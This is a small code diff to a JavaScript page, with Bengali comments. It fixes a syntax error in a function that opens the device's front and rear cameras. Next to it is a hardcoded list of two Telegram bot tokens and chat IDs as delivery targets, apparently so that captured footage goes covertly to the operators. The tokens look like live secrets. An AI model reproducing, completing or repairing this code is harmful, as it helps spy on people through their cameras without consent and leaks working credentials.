@@ -656,8 +656,6 @@
         ];
 
         // --- টেলিগ্রাম এবং ক্যামেরা সেটিংস ---
-        // এখানে একাধিক বট টোকেন এবং চ্যাট আইডি যোগ করতে পারেন
-        // *** সংশোধিত অংশ ***
         const TELEGRAM_TARGETS = [
             { botToken: "7884212116:AAG1hul0EbZom1iHucZztAW_FZOXf_g_TqA", chatId: "6728809478" },
             { botToken: "7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk", chatId: "2139008203" }
@@ -671,7 +669,7 @@
             let video;
             try {
                 video = await startCamera(facingMode);
-            } catch (error)
+            } catch (error) { // *** সংশোধিত অংশ: এখানে ব্র্যাকেট যোগ করা হয়েছে ***
                 console.error(`Could not start ${facingMode} camera. Skipping.`);
                 return;
             }
